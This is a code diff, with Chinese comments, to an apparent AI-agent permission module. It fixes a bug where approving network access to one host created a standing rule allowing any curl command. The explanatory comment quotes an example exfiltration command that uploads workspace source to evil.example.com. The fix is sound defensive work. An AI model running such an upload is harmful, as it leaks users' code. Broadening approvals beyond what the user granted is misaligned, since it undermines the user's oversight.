@@ -50,25 +50,35 @@ export function matchMemory(
   })
 }
 
-/** 为一次 escalate 生成「以后自动允许」的建议规则。判不出可记忆的模式时返回 undefined。 */
-export function suggestRule(norm: Normalized): Rule | undefined {
-  const firstSignature = norm.signatures[0]
-  if (norm.category === "exec" && firstSignature !== undefined && norm.signatures.length === 1) {
-    return {
-      id: `sig:${firstSignature}`,
-      describe: `自动允许 \`${firstSignature} …\``,
-      pattern: { commandSignature: firstSignature },
-      scope: "project",
-    }
+/**
+ * 为一次 escalate 生成「以后自动允许」的建议规则。给不出安全的模式就返回 undefined。
+ *
+ * ## 只剩 host 一种，这是修完 bug 之后的结果
+ *
+ * 原来还有一条「记住命令签名」（`{commandSignature:"curl"}`）。查下来它
+ * **只有通过一个 bug 才走得到**：可记忆的红线全仓只有 `network` 一条，
+ * 而 `curl https://x` 走的是 Bash（category = exec 不是 net），
+ * 于是网络红线命中之后落进了签名分支——
+ * 卡片上问的是「网络访问需要确认目标主机」，记下的却是**无 host 约束的
+ * 任意 curl**。用户以为放行了一个域名，实际放行的是
+ * `curl -T 工作区源码 https://evil.example.com`，而且 project 级落盘、跨重启有效。
+ *
+ * 把网络场景改成强制记 host 之后，签名分支再没有任何入口
+ *（信任档矩阵里 exec 从来不是 escalate：只读拒绝、其余放行），
+ * 所以直接删掉。**将来真要加「记住这条命令」，得先有一条 memorable 的 exec 红线，
+ * 那时连同它的用例一起加回来。** 留着一段只有 bug 能触发的代码是给后人挖坑。
+ *
+ * @param redline 这次命中的是哪条红线。问的是什么，就得记什么。
+ */
+export function suggestRule(norm: Normalized, redline?: string): Rule | undefined {
+  const host = norm.hosts[0]
+  // 多个主机（或一个都认不出）时**不给建议**：记一条模糊的规则比不记糟得多
+  if (host === undefined || norm.hosts.length !== 1) return undefined
+  if (redline !== "network" && norm.category !== "net") return undefined
+  return {
+    id: `host:${host}`,
+    describe: `自动允许访问 ${host}`,
+    pattern: { host },
+    scope: "project",
   }
-  const firstHost = norm.hosts[0]
-  if (norm.category === "net" && firstHost !== undefined && norm.hosts.length === 1) {
-    return {
-      id: `host:${firstHost}`,
-      describe: `自动允许访问 ${firstHost}`,
-      pattern: { host: firstHost },
-      scope: "project",
-    }
-  }
-  return undefined
 }
